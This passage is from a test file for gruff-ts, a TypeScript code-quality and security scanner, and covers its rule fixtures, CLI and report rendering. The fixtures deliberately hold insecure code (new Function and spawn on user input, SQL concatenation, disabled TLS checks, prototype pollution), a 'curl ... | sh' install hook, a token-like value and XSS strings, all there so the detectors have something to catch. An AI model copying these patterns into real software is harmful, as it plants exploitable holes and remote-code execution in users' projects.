  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("test-quality.missing-nearby-test"), true);
  assert.equal(ruleIds.has("test-quality.snapshot-only-test"), true);
  assert.equal(ruleIds.has("test-quality.no-throw-only-test"), true);
  assert.equal(ruleIds.has("test-quality.no-assertions"), false);

  const missingTestPaths = report.findings.filter((finding) => finding.ruleId === "test-quality.missing-nearby-test").map((finding) => finding.filePath);
  assert.deepEqual(missingTestPaths, ["src/payments.ts"]);
});

test("expanded scanner config disables and overrides new rules", () => {
  const source = `API_TOKEN=qR8vT3mK6pL9xS2nD4eG

function branchLightly(input: string): string {
  if (input === "a") return "a";
  if (input === "b") return "b";
  return "c";
}
`;
  const report = analyseFixture(source, {
    fileName: ".env.ts",
    config: {
      rules: {
        "sensitive-data.hardcoded-env-value": { enabled: false },
        "complexity.npath": { threshold: 3, severity: "warning" },
      },
    },
  });
  assert.equal(report.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);
  assert.equal(report.findings.some((finding) => finding.ruleId === "complexity.npath"), true);
});

test("cumulative expanded fixture covers every new rule with unique fingerprints", () => {
  const report = analyseProject(
    {
    "Widget.ts": `import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { readFileSync, statSync, writeFileSync } from "node:fs";

// TODO add ownership
// See \`src/missing-widget.ts\` before changing this fixture.
// eslint-disable-next-line no-console
export class WidgetRecord {
  public active = true;
  public name: string;

  public constructor(name: string) {
    this.name = name;
  }

  public read(profile?: { name?: string }, fallbackName?: string): string {
    const displayName = fallbackName || "anonymous";
    if (profile && profile.name) {
      return profile.name;
    }
    return displayName;
  }
}

const data1 = "placeholder";
const strName = "Ada";
const objUser = { name: strName };
const loadedText = readFileSync("input.txt", "utf8");
const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";
const maxRetryLimit = 12;

interface WidgetShape {
  name: string;
}

interface WidgetFlags {
  ready: boolean;
}

function applyWidget(x: number, value: string): string {
  const { a } = { a: 1 };
  return value + x + a;
}

// ${COMMENTED_OUT_SECRET_LOAD}

/** Handles route status branches. */
function routeOrder(state: string, unusedFlag: boolean): string {
  if (state === "new") return "new";
  if (state === "paid") return "paid";
  if (state === "sent") return "sent";
  if (state === "closed") return "closed";
  if (loadedText.length > 0) return loadedText;
  return "unknown";
}

function emptyWork(): void {}

function redundantResult(): string {
  const calculatedResult = routeOrder("new", true);
  return calculatedResult;
}

/** Saves widget output. */
function persistWidgetOutput(path: string): void {
  writeFileSync(path, "ok");
}

/** Parses risky widget input. */
function parseWidgetInput(value: string): string {
  if (!value) {
    throw new Error("missing value");
  }
  return value;
}

/** Widget report details. */
interface WidgetReportEnvelope {
  schemaVersion: string;
  fingerprint: string;
}

export function unsafePublicApi(input: ${"any"}): ${"any"} {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as ${"unknown"} as { name?: string };
  return user${"!"}.name;
}

async function unsafe(userInput: string, userId: string, userIds: string[]): Promise<void> {
  new Function(userInput)();
  setTimeout("alert(1)", 10);
  window.setInterval("alert(1)", 10);
  spawn(userInput, []);
  Math.random();
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
  const insecureAgent = { rejectUnauthorized: false, minVersion: "TLSv1" };
  location.href = "javascript:alert(1)";
  element.dangerouslySetInnerHTML = { __html: userInput };
  element.__proto__ = {};
  db.query("SELECT * FROM users WHERE id = " + userId);
  createHash("md5").update(userInput);
  const timestamp = new Date().getTime();
  const copy = Object.assign({}, { userId });
  if (!!userId) {
    observe(copy);
  }
  if (userId == "legacy") {
    observe(timestamp);
  }
  userIds.forEach(${"async"} (userId) => {
    await sendEmailAsync(userId);
  });
  ${"sendEmailAsync"}(userIds[0]);
  try {
    riskyWork();
  } catch (error) {
    throw error;
  }
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // ignored
  }
  void insecureAgent;
  throw ${JSON.stringify("dynamic failure")};
}

function finish(): void {
  doWork();
  return;
}

const packageJsonFixture = ${JSON.stringify(JSON.stringify({
  scripts: {
    postinstall: "node scripts/setup.js",
    prepare: "curl https://example.test/install.sh | sh",
  },
  bin: {
    "missing-cli": "./bin/missing.js",
    "bad-cli": "./bin/bad.js",
  },
  dependencies: {
    "wide-open": "*",
    "remote-tool": "git+https://github.com/example/remote-tool.git",
  },
}))};

const tsconfigFixture = ${JSON.stringify(JSON.stringify({
  compilerOptions: {
    strict: false,
    noUncheckedIndexedAccess: false,
    exactOptionalPropertyTypes: false,
  },
}))};

/**
 * Scores amount.
 * @param stale Removed parameter.
 */
export function scoreAmount(amount: number): number {
  return amount + objUser.name.length;
}

/** updateName */
export function updateName(name: string): string {
  return name;
}

test("trivial assertion", () => {
  assert.equal(1, 1);
});

test("magic assertion", () => {
  const total = routeOrder("new", false).length;
  expect(total).toBe(42);
});

test("mock only", () => {
  const serviceMock = vi.fn();
  serviceMock();
  expect(serviceMock).toHaveBeenCalled();
});

test("unused mock", () => {
  const unusedMock = jest.fn();
  assert.ok(true);
});

test("exception type only", () => {
  expect(() => fail()).toThrow(Error);
});

test("global mutation", () => {
  process.env.NODE_ENV = "test";
  assert.equal(process.env.NODE_ENV, "test");
});

test("snapshot only", () => {
  expect(routeOrder("new", false)).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => routeOrder("new", false));
});

test("setup bloat", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  const four = buildFour();
  const five = buildFive();
  const six = buildSix();
  const seven = buildSeven();
  const eight = buildEight();
  const nine = buildNine();
  const ten = buildTen();
  const eleven = buildEleven();
  const twelve = buildTwelve();
  const thirteen = buildThirteen();
  expect(one).toBeDefined();
});
`,
    "src/fixture-purpose.test.ts": [
      "const report = analyseFixture(`",
      ...largeFixtureSourceLines("expandedFixtureValue"),
      "`);",
      "void report;",
    ].join("\n"),
    "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";

export function renderController(): string {
  return sharedHelper();
}
`,
    "src/cycle/a.ts": `import { fromB } from "./b";

export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";

export function fromB(): string {
  return fromA();
}
`,
    "src/shared/helper.ts": `export function sharedHelper(): string {
  return "shared";
}
`,
    ".env": `API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
PATIENT_SSN=${SSN_FIXTURE_VALUE}
`,
    "package.json": JSON.stringify({
      scripts: {
        postinstall: "node scripts/setup.js",
        prepare: "curl https://example.test/install.sh | sh",
      },
      bin: {
        "missing-cli": "./bin/missing.js",
        "bad-cli": "./bin/bad.js",
      },
      dependencies: {
        "wide-open": "*",
        "remote-tool": "git+https://github.com/example/remote-tool.git",
      },
    }),
    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
    "tsconfig.json": JSON.stringify({
      compilerOptions: {
        strict: false,
        noUncheckedIndexedAccess: false,
        exactOptionalPropertyTypes: false,
      },
    }),
    },
    { config: { rules: { "complexity.npath": { threshold: 20, severity: "warning" } } } },
  );
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of expandedRuleIds) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  const descriptorIds = new Set(ruleDescriptors().map((descriptor) => descriptor.ruleId));
  for (const ruleId of ruleIds) {
    assert.equal(descriptorIds.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
  }
  assert.equal(new Set(report.findings.map((finding) => finding.fingerprint)).size, report.findings.length);

  const sampleMessages = new Map(report.findings.filter((finding) => expandedRuleIds.has(finding.ruleId)).map((finding) => [finding.ruleId, finding.message]));
  assert.match(sampleMessages.get("security.new-function") ?? "", /dynamic code/);
  assert.match(sampleMessages.get("test-quality.setup-bloat") ?? "", /setup lines/);
  assert.match(sampleMessages.get("sensitive-data.hardcoded-env-value") ?? "", /Redacted preview/);
});

test("rule descriptors cover emitted rules and fixture-backed coverage", () => {
  const descriptors = ruleDescriptors();
  const descriptorIds = descriptors.map((descriptor) => descriptor.ruleId);
  assert.deepEqual(descriptorIds, [...descriptorIds].sort());
  assert.equal(new Set(descriptorIds).size, descriptorIds.length);

  for (const descriptor of descriptors) {
    assert.match(descriptor.ruleId, /^[a-z-]+\.[a-z0-9-]+$/);
    assert.ok(descriptor.description.length > 10, `description for ${descriptor.ruleId}`);
    assert.ok(descriptor.remediation.length > 10, `remediation for ${descriptor.ruleId}`);
    if (descriptor.optionKeys) {
      assert.deepEqual(descriptor.optionKeys, [...descriptor.optionKeys].sort(), `option key ordering for ${descriptor.ruleId}`);
      assert.equal(new Set(descriptor.optionKeys).size, descriptor.optionKeys.length, `option key uniqueness for ${descriptor.ruleId}`);
    }
  }

  const coverageIds = ruleCatalogueCoverageRuleIds();
  const descriptorIdSet = new Set(descriptorIds);
  for (const ruleId of coverageIds) {
    assert.equal(descriptorIdSet.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
  }
  for (const descriptor of descriptors) {
    if (descriptor.fixtureExemption) {
      assert.ok(descriptor.fixtureExemption.length > 10, `fixture exemption reason for ${descriptor.ruleId}`);
      continue;
    }
    assert.equal(coverageIds.has(descriptor.ruleId), true, `missing positive fixture coverage for ${descriptor.ruleId}`);
  }
});

test("rule quality doctrine covers risky scanner descriptors", () => {
  const descriptors = new Map(ruleDescriptors().map((descriptor) => [descriptor.ruleId, descriptor]));
  const doctrine = new Map<string, RuleQualityDoctrineCase>(riskyRuleQualityDoctrine.map((entry) => [entry.ruleId, entry]));
  const exceptions = new Map<string, string>(riskyRuleQualityExceptions.map((entry) => [entry.ruleId, entry.reason]));
  const categoryVocabulary = [...RULE_QUALITY_FIXTURE_CATEGORIES].sort();

  for (const ruleId of riskyRuleIdsRequiringNoisyValidProof) {
    const descriptor = descriptors.get(ruleId);
    assert.notEqual(descriptor, undefined, `risky rule has no descriptor: ${ruleId}`);

    const entry = doctrine.get(ruleId);
    const exception = exceptions.get(ruleId);
    assert.equal(Boolean(entry) || Boolean(exception), true, `risky rule missing noisy-valid doctrine or exception: ${ruleId}`);

    if (!entry) {
      assert.ok((exception ?? "").length > 80, `risky rule exception is too terse: ${ruleId}`);
      continue;
    }
    assert.equal(exception, undefined, `risky rule should use doctrine or exception, not both: ${ruleId}`);
    assert.equal(descriptor?.pillar, entry.expectedPillar, `pillar drift for ${ruleId}`);
    assert.equal(descriptor?.severity, entry.expectedSeverity, `severity drift for ${ruleId}`);
    assert.equal(descriptor?.confidence, entry.expectedConfidence, `confidence drift for ${ruleId}`);
    assert.deepEqual([...entry.fixtureCategories].sort(), categoryVocabulary, `fixture vocabulary for ${ruleId}`);

    for (const [field, value] of [
      ["signalSource", entry.signalSource],
      ["invalidFixture", entry.invalidFixture],
      ["noisyValidFixture", entry.noisyValidFixture],
      ["missingInvalidFixture", entry.missingInvalidFixture],
      ["falsePositiveEscapeHatch", entry.falsePositiveEscapeHatch],
      ["fingerprintStability", entry.fingerprintStability],
    ] as const) {
      assert.ok(value.length > 20, `${field} is too terse for ${ruleId}`);
    }
  }
});

test("rule descriptor thresholds and options match implementation and config defaults", () => {
  const descriptors = ruleDescriptors();
  const descriptorThresholds = new Map(
    descriptors.filter((descriptor) => typeof descriptor.threshold === "number").map((descriptor) => [descriptor.ruleId, descriptor.threshold ?? 0]),
  );
  const descriptorSeverities = new Map(
    descriptors.filter((descriptor) => typeof descriptor.threshold === "number").map((descriptor) => [descriptor.ruleId, descriptor.severity]),
  );
  const descriptorOptions = new Map(
    descriptors.filter((descriptor) => (descriptor.optionKeys ?? []).length > 0).map((descriptor) => [descriptor.ruleId, [...(descriptor.optionKeys ?? [])].sort()]),
  );
  const implementationSources = ["src/cli.ts", "src/sensitive-data-rules.ts"].map((path) => readFileSync(path, "utf8")).join("\n");
  const implementationThresholds = thresholdUsages(implementationSources);
  assert.deepEqual(descriptorThresholds, implementationThresholds);
  assert.deepEqual(descriptorOptions, optionUsages(implementationSources));

  const configSource = readFileSync(".gruff-ts.yaml", "utf8");
  const configThresholds = yamlThresholdDefaults(configSource);
  assert.deepEqual(configThresholds, descriptorThresholds);
  assert.deepEqual(yamlSeverityDefaults(configSource), descriptorSeverities);
  assert.deepEqual(yamlOptionDefaults(configSource), descriptorOptions);
});

test("root CLI exposes gruff console command and option parity", () => {
  const list = execFileSync("./bin/gruff-ts", [], { encoding: "utf8" });
  const help = execFileSync("./bin/gruff-ts", ["--help"], { encoding: "utf8" });
  const explicitList = execFileSync("./bin/gruff-ts", ["list"], { encoding: "utf8" });

  assert.equal(help, list);
  assert.equal(explicitList, list);
  assert.match(list, /^gruff-ts 0\.1\.0\n\nUsage:\n  command \[options\] \[arguments\]/);
  for (const option of ["-h, --help", "--silent", "-q, --quiet", "-V, --version", "--ansi|--no-ansi", "-n, --no-interaction", "-v|vv|vvv, --verbose"]) {
    assert.match(list, new RegExp(option.replace(/[|]/g, "\\|")));
  }
  for (const command of ["analyse", "completion", "dashboard", "help", "list", "list-rules", "report", "summary"]) {
    assert.match(list, new RegExp(`^  ${command}\\s+`, "m"));
  }
});

test("root CLI mirrors gruff php ANSI menu styling", () => {
  const ansiMenu = execFileSync("./bin/gruff-ts", ["--ansi"], { encoding: "utf8" });
  const plainMenu = execFileSync("./bin/gruff-ts", ["--no-ansi"], { encoding: "utf8" });

  assert.match(ansiMenu, /gruff-ts \u001b\[32m0\.1\.0\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[33mUsage:\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[33mOptions:\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[32m-h, --help\u001b\[39m/);
  assert.match(ansiMenu, /display help for the \u001b\[32mlist\u001b\[39m command/i);
  assert.match(ansiMenu, /\u001b\[33mAvailable commands:\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[32manalyse\u001b\[39m/);
  assert.equal(/\u001b\[[0-9;]*m/.test(plainMenu), false);
});

test("list-rules CLI prints text and deterministic json", () => {
  assert.equal(assertRuleListTextOutput(), true);
  assert.equal(assertRuleListJsonOutput(), true);
});

/** Spawns the rule catalogue command and verifies representative metadata. */
function assertRuleListTextOutput(): boolean {
  const text = execFileSync("./bin/gruff-ts", ["list-rules"], { encoding: "utf8" });
  assert.match(text, /gruff-ts 0\.1\.0 rules \(\d+\)/);
  assert.match(text, /security\.eval-call \| security \| error \| high \|/);
  assert.match(text, /complexity\.npath \| complexity \| warning \| medium \| .*threshold: 20/);
  return true;
}

/** Verifies the JSON rule catalogue stays deterministic and complete enough for consumers. */
function assertRuleListJsonOutput(): boolean {
  const parsed = readDeterministicRuleListJson();
  assert.equal(parsed.schemaVersion, undefined);
  assert.equal(parsed.tool?.name, "gruff-ts");
  assert.equal(ruleListJsonHasThreshold(parsed, "design.deep-relative-import", 2), true);
  assert.equal(ruleListJsonHasOptionKey(parsed, "design.large-module-concentration", "minFiles"), true);
  return true;
}

type RuleListJsonRule = {
  ruleId?: string;
  pillar?: string;
  severity?: string;
  confidence?: string;
  description?: string;
  threshold?: number;
  optionKeys?: string[];
};

type RuleListJsonPayload = {
  schemaVersion?: string;
  tool?: { name?: string; version?: string };
  rules?: RuleListJsonRule[];
};

/** Reads two JSON catalogue renders and proves the bytes are stable. */
function readDeterministicRuleListJson(): RuleListJsonPayload {
  const firstJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
  const secondJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
  assert.equal(firstJsonText, secondJsonText);
  return JSON.parse(firstJsonText) as RuleListJsonPayload;
}

/** Checks one rule threshold without making the catalogue test branch-heavy. */
function ruleListJsonHasThreshold(payload: RuleListJsonPayload, ruleId: string, threshold: number): boolean {
  return payload.rules?.some((rule) => rule.ruleId === ruleId && rule.threshold === threshold) ?? false;
}

/** Checks one rule option key without making the catalogue test branch-heavy. */
function ruleListJsonHasOptionKey(payload: RuleListJsonPayload, ruleId: string, optionKey: string): boolean {
  return payload.rules?.some((rule) => rule.ruleId === ruleId && rule.optionKeys?.includes(optionKey)) ?? false;
}

test("console globals suppress normal output and completion emits a script", () => {
  const quietRules = execFileSync("./bin/gruff-ts", ["--quiet", "list-rules"], { encoding: "utf8" });
  assert.equal(quietRules, "");

  const completion = execFileSync("./bin/gruff-ts", ["completion"], { encoding: "utf8" });
  assert.match(completion, /complete -F _gruff_ts_completion gruff-ts/);
  assert.match(completion, /commands="analyse completion dashboard list list-rules report summary"/);
  assert.match(completion, /text json html markdown github hotspot sarif/);

  const analyseHelp = execFileSync("./bin/gruff-ts", ["analyse", "--help"], { encoding: "utf8" });
  assert.match(analyseHelp, /sarif/);
});

test("summary CLI prints compact scan digest without per-finding spam", () => {
  const output = execFileSync("./bin/gruff-ts", ["summary", "fixtures/sample.ts", "--fail-on=none", "--no-config", "--no-baseline"], { encoding: "utf8" });
  assert.match(output, /^gruff-ts 0\.1\.0 summary/);
  assert.match(output, /Per-pillar counts:/);
  assert.match(output, /Top rules:/);
  assert.match(output, /Top file offenders:/);
  assert.equal(output.includes("Findings:\n- ["), false);
});

test("json report uses schema version", () => {
  const report = analyse({
    paths: [],
    noConfig: true,
    format: "json",
    failOn: "none",
    includeIgnored: false,
    noBaseline: true,
  });
  const rendered = renderReport(report, "json");
  assert.match(rendered, /"schemaVersion": "gruff\.analysis\.v1"/);
});

test("sarif report renders code scanning contract without mutating native json schema", () => {
  const report: AnalysisReport = {
    schemaVersion: "gruff.analysis.v1",
    tool: { name: "gruff-ts", version: "0.1.0-test" },
    run: { projectRoot: "/tmp/project", format: "sarif", failOn: "none", generatedAt: "2026-05-15T00:00:00.000Z" },
    summary: { advisory: 1, warning: 1, error: 1, total: 3 },
    paths: { analysedFiles: 1, ignoredPaths: [], missingPaths: [] },
    diagnostics: [],
    findings: [
      {
        ruleId: "security.eval-call",
        message: "Avoid eval().",
        filePath: "./src\\bad.ts",
        line: 7,
        endLine: 10,
        column: 3,
        severity: "error",
        pillar: "security",
        secondaryPillars: ["sensitive-data"],
        tier: "v0.1",
        confidence: "high",
        symbol: "run",
        remediation: "Use a dispatch table.",
        metadata: { target: "eval" },
        fingerprint: "abc123",
      },
      {
        ruleId: "waste.console-log",
        message: "Avoid console logging.",
        filePath: "src\\warn.ts",
        line: 8,
        severity: "warning",
        pillar: "waste",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "high",
        metadata: {},
        fingerprint: "def456",
      },
      {
        ruleId: "docs.missing-public-doc",
        message: "Document public exports.",
        filePath: "./src/docs.ts",
        line: 9,
        severity: "advisory",
        pillar: "documentation",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "medium",
        metadata: { exported: true },
        fingerprint: "ghi789",
      },
    ],
    score: {
      composite: 91,
      grade: "A",
      pillars: [{ pillar: "security", score: 91, findings: 1 }],
      topOffenders: [{ filePath: "src/bad.ts", score: 91, findings: 1 }],
    },
  };

  const beforeSarif = JSON.stringify(report);
  const payload = JSON.parse(renderReport(report, "sarif"));
  assert.equal(JSON.stringify(report), beforeSarif);
  const rules = payload.runs[0].tool.driver.rules as Array<{
    id: string;
    name: string;
    shortDescription: { text: string };
    fullDescription: { text: string };
    help: { text: string };
    properties: Record<string, unknown>;
  }>;
  const descriptors = ruleDescriptors();
  const ruleIds = rules.map((rule) => rule.id);
  const results = payload.runs[0].results;
  const result = results[0];
  const evalDescriptor = descriptors.find((descriptor) => descriptor.ruleId === "security.eval-call");
  const evalRule = rules.find((rule) => rule.id === "security.eval-call");

  assert.equal(payload.version, "2.1.0");
  assert.equal(payload.runs[0].tool.driver.name, "gruff-ts");
  assert.equal(payload.runs[0].tool.driver.semanticVersion, "0.1.0-test");
  assert.deepEqual(ruleIds, [...ruleIds].sort());
  assert.deepEqual(ruleIds, descriptors.map((descriptor) => descriptor.ruleId));
  assert.ok(evalDescriptor);
  assert.ok(evalRule);
  assert.equal(evalRule.name, evalDescriptor.ruleId);
  assert.equal(evalRule.shortDescription.text, evalDescriptor.description);
  assert.equal(evalRule.fullDescription.text, evalDescriptor.description);
  assert.equal(evalRule.help.text, evalDescriptor.remediation);
  assert.equal(evalRule.properties.pillar, evalDescriptor.pillar);
  assert.equal(evalRule.properties.defaultSeverity, evalDescriptor.severity);
  assert.equal(evalRule.properties.confidence, evalDescriptor.confidence);
  assert.equal(evalRule.properties.defaultEnabled, true);
  for (const sarifResult of results) {
    assert.equal(rules[sarifResult.ruleIndex]?.id, sarifResult.ruleId);
    assert.equal(typeof sarifResult.partialFingerprints.gruffFingerprint, "string");
    assert.equal("primary" in sarifResult.partialFingerprints, false);
    assert.equal("codeFlows" in sarifResult, false);
    assert.equal("threadFlows" in sarifResult, false);
    assert.equal("fixes" in sarifResult, false);
    assert.equal("relatedLocations" in sarifResult, false);
    assert.equal("suppressions" in sarifResult, false);
  }
  assert.equal(result.ruleId, "security.eval-call");
  assert.equal(result.ruleIndex, ruleIds.indexOf("security.eval-call"));
  assert.equal(result.level, "error");
  assert.equal(result.message.text, "Avoid eval().");
  assert.equal(result.locations[0].physicalLocation.artifactLocation.uri, "src/bad.ts");
  assert.equal(result.locations[0].physicalLocation.region.startLine, 7);
  assert.equal(result.locations[0].physicalLocation.region.startColumn, 3);
  assert.equal(result.locations[0].physicalLocation.region.endLine, 10);
  assert.equal(result.partialFingerprints.gruffFingerprint, "abc123");
  assert.equal(result.properties.severity, "error");
  assert.equal(result.properties.pillar, "security");
  assert.deepEqual(result.properties.secondaryPillars, ["sensitive-data"]);
  assert.equal(result.properties.symbol, "run");
  assert.equal(result.properties.remediation, "Use a dispatch table.");
  assert.equal(result.properties.metadata.target, "eval");
  assert.equal(results[1].level, "warning");
  assert.equal(results[1].locations[0].physicalLocation.artifactLocation.uri, "src/warn.ts");
  assert.equal(results[1].properties.severity, "warning");
  assert.deepEqual(results[1].properties.metadata, {});
  assert.equal(results[2].level, "note");
  assert.equal(results[2].locations[0].physicalLocation.artifactLocation.uri, "src/docs.ts");
  assert.equal(results[2].properties.severity, "advisory");
  assert.equal(payload.runs[0].properties.gruffSchemaVersion, "gruff.analysis.v1");
  assert.equal(payload.runs[0].properties.generatedAt, "2026-05-15T00:00:00.000Z");
  assert.equal(payload.runs[0].properties.score, 91);
  assert.equal(payload.runs[0].properties.grade, "A");
  assert.equal(JSON.parse(renderReport(report, "json")).schemaVersion, "gruff.analysis.v1");
  assert.equal(JSON.stringify(report), beforeSarif);
});

test("analyse CLI emits parseable sarif for both format syntaxes", () => {
  for (const formatArgs of [
    ["--format", "sarif"],
    ["--format=sarif"],
  ] as const) {
    const output = execFileSync("./bin/gruff-ts", ["analyse", "fixtures/sample.ts", ...formatArgs, "--fail-on=none", "--no-config", "--no-baseline"], { encoding: "utf8" });
    const payload = JSON.parse(output);
    const rules = payload.runs[0].tool.driver.rules;
    const ruleIds = rules.map((rule: { id: string }) => rule.id);
    const results = payload.runs[0].results;

    assert.equal(payload.version, "2.1.0");
    assert.equal(payload.runs.length, 1);
    assert.equal(payload.runs[0].tool.driver.name, "gruff-ts");
    assert.equal(payload.runs[0].tool.driver.semanticVersion, "0.1.0");
    assert.deepEqual(ruleIds, [...ruleIds].sort());
    assert.equal(results.length > 0, true);
    for (const sarifResult of results) {
      assert.equal(typeof sarifResult.partialFingerprints.gruffFingerprint, "string");
      if ("ruleIndex" in sarifResult) {
        assert.equal(rules[sarifResult.ruleIndex].id, sarifResult.ruleId);
      }
      const uri = sarifResult.locations[0].physicalLocation.artifactLocation.uri;
      assert.equal(uri.startsWith("./"), false);
      assert.equal(uri.includes("\\"), false);
    }
  }
});

test("sarif fail-on preserves error exit behavior", () => {
  const dir = mkdtempSync(join(tmpdir(), "gruff-ts-sarif-fail-on-"));
  try {
    const target = join(dir, "bad.ts");
    writeFileSync(
      target,
      `export function run(source: string): unknown {
  return eval(source);
}
`,
    );

    const result = spawnSync("./bin/gruff-ts", ["analyse", target, "--format", "sarif", "--fail-on", "error", "--no-config", "--no-baseline"], { encoding: "utf8" });
    assert.equal(result.status, 1);
    assert.equal(result.stderr, "");
    const payload = JSON.parse(result.stdout);
    assert.equal(payload.version, "2.1.0");
    assert.equal(payload.runs[0].results.some((sarifResult: { ruleId?: string }) => sarifResult.ruleId === "security.eval-call"), true);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("html report uses dashboard parity anchors and escapes values", () => {
  const report: AnalysisReport = {
    schemaVersion: "gruff.analysis.v1",
    tool: { name: "gruff-ts", version: "0.1.0-test<script>" },
    run: { projectRoot: "/tmp/project", format: "html", failOn: "none", generatedAt: "2026-05-15T00:00:00.000Z" },
    summary: { advisory: 0, warning: 1, error: 1, total: 2 },
    paths: { analysedFiles: 1, ignoredPaths: [], missingPaths: [] },
    diagnostics: [],
    findings: [
      {
        ruleId: "docs.<script>",
        message: "Message with <script>alert(1)</script>",
        filePath: "src/<bad>.ts",
        line: 7,
        severity: "warning",
        pillar: "documentation",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "high",
        symbol: "badSymbol",
        metadata: {},
        fingerprint: "abc123",
      },
      {
        ruleId: "complexity.cyclomatic",
        message: "Function has cyclomatic complexity 12.",
        filePath: "src/Complex.ts",
        line: 11,
        severity: "error",
        pillar: "complexity",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "high",
        symbol: "run",
        metadata: {},
        fingerprint: "def456",
      },
    ],
    score: {
      composite: 82.5,
      grade: "B",
      pillars: [{ pillar: "documentation", score: 84, findings: 1 }],
      topOffenders: [{ filePath: "src/<bad>.ts", score: 88, findings: 1 }],
    },
  };

  const rendered = renderReport(report, "html");

  for (const anchor of ["paper", "masthead", "wordmark", "verdict", "grade-stamp", "pillar-grid", "offender-list", "chart-section", "finding"]) {
    assert.match(rendered, new RegExp(`class="${anchor}`));
  }
  assert.match(rendered, /gruff-ts/);
  assert.match(rendered, /ts\/js code quality/);
  assert.match(rendered, /src\/&lt;bad&gt;\.ts/);
  assert.match(rendered, /docs\.&lt;script&gt;/);
  assert.match(rendered, /Message with &lt;script&gt;alert\(1\)&lt;\/script&gt;/);
  assert.equal(rendered.includes("0.1.0-test<script>"), false);
  assert.equal(rendered.includes("src/<bad>.ts"), false);
  assert.equal(rendered.includes("<script>alert(1)</script>"), false);
});

test("html report rendering does not mutate json report output", () => {
  const report = analyseFixture(`export function process(value: string): string {
  return value;
}
`);
  const before = renderReport(report, "json");

  renderReport(report, "html");

  assert.equal(renderReport(report, "json"), before);
  assert.match(before, /"schemaVersion": "gruff\.analysis\.v1"/);
});

test("dashboard root uses parity shell and escapes controls", async () => {
  const projectRoot = mkdtempSync(join(tmpdir(), "gruff-ts-dashboard-<bad>-"));
  try {
    writeFileSync(join(projectRoot, "sample.ts"), `export function sample(): string {
  return "ok";
}
`);
    await withDashboard(projectRoot, async (baseUrl) => {
      const rootHtml = await fetchText(`${baseUrl}/?projectRoot=${encodeURIComponent(projectRoot)}&path=sample.ts`);
      for (const anchor of ["controls-toggle", "controls-panel", "report-frame", "scan-form"]) {
        assert.match(rootHtml, new RegExp(`class="${anchor}`));
      }
      assert.match(rootHtml, /Project root/);
      assert.match(rootHtml, /Paths/);
      assert.match(rootHtml, /&lt;bad&gt;/);
      assert.match(rootHtml, /src="\/scan\?projectRoot=/);
      assert.equal(rootHtml.includes("<bad>"), false);
    });
  } finally {
    rmSync(projectRoot, { recursive: true, force: true });
  }
});

test("dashboard scan returns report shell with escaped dashboard context", async () => {
  const projectRoot = mkdtempSync(join(tmpdir(), "gruff-ts-dashboard-<bad>-"));
  try {
    writeFileSync(join(projectRoot, "sample.ts"), `export function sample(): string {
  return "ok";
}
`);
    await withDashboard(projectRoot, async (baseUrl) => {
      const scanHtml = await fetchText(`${baseUrl}/scan?projectRoot=${encodeURIComponent(projectRoot)}&path=sample.ts`);
      assert.match(scanHtml, /class="paper"/);
      assert.match(scanHtml, /class="dashboard-context"/);
      assert.match(scanHtml, /Project root/);
      assert.match(scanHtml, /sample\.ts/);
      assert.match(scanHtml, /&lt;bad&gt;/);
      assert.equal(scanHtml.includes("<bad>"), false);
    });
  } finally {
    rmSync(projectRoot, { recursive: true, force: true });
  }
});

// Configures temporary project scans used by tests.
interface AnalyseProjectOptions {
  config?: Record<string, unknown>;
  configPath?: string;
  executableFiles?: string[];
  includeIgnored?: boolean;
  noConfig?: boolean;
  paths?: string[];
}

// Adds a fixture filename override for single-source test scans.
interface AnalyseFixtureOptions extends AnalyseProjectOptions {
  fileName?: string;
}

// Runs one source string through the temporary-project analysis helper.
function analyseFixture(source: string, options: AnalyseFixtureOptions = {}) {
  return analyseProject(
    { [options.fileName ?? "bad.ts"]: source },
    {
      ...(options.config ? { config: options.config } : {}),
      ...(typeof options.configPath === "string" ? { configPath: options.configPath } : {}),
      ...(typeof options.noConfig === "boolean" ? { noConfig: options.noConfig } : {}),
    },
  );
}

// Creates a temporary project, runs analysis inside it, and removes the fixture tree. Performs the required filesystem or process side effect.
function analyseProject(files: Record<string, string>, options: AnalyseProjectOptions = {}) {
  const dir = mkdtempSync(join(tmpdir(), "gruff-ts-"));
  const previous = cwd();
  try {
    setupAnalyseProjectDirectory(dir, files, options);
    chdir(dir);
    return analyseProjectInCurrentDirectory(options);
  } finally {
    chdir(previous);
    rmSync(dir, { recursive: true, force: true });
  }
}

/** Writes fixture files, executability bits, and optional config for project tests. */
function setupAnalyseProjectDirectory(dir: string, files: Record<string, string>, options: AnalyseProjectOptions): void {
  writeFixtureFiles(dir, files);
  for (const fileName of options.executableFiles ?? []) {
    chmodSync(join(dir, fileName), 0o755);
  }
  if (options.config) {
